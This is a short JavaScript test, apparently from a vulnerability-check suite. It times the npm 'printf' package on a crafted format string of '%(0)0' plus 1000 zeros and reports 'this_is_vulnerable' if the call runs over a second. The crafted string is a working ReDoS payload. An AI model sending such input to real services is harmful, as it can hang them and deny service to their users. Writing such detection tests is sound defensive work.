// test("ReDos in printf", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const printf = require("printf");
  let t = measureTime(function () {
    let attack_str = "%(0)0" + genstr(1000, "0") + "\u25CE";
    printf(attack_str, -42);
  });
  let time = t[0] + t[1] / 1000000000;
if (time > 1) {
	console.log("this_is_vulnerable")
} else {
	console.log("this_is_OK")
}
// });
